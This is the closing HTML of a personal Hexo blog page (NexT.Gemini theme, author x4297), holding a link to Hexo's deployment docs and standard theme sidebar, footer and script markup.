<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="x4297"
      src="/images/Yuumi.jpg">
  <p class="site-author-name" itemprop="name">x4297</p>
  <div class="site-description" itemprop="description">开摆!</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">x4297</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
